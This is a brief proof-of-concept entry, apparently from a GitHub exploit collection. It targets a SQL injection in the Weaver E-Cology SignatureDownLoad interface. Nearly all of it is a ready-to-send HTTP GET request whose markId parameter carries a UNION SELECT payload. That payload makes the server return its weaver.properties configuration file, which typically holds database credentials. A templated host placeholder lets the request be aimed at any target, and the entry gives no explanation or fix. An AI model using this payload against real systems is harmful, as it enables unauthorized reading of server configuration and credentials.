# weaver_SignatureDownLoad_sqli

from: https://github.com/wy876/POC/blob/83ffd34e35da0bb8b1f8325dd4810e31b0d8a01a/%E6%B3%9B%E5%BE%AEE-Cology%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3SignatureDownLoad%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.5.20

```
GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```
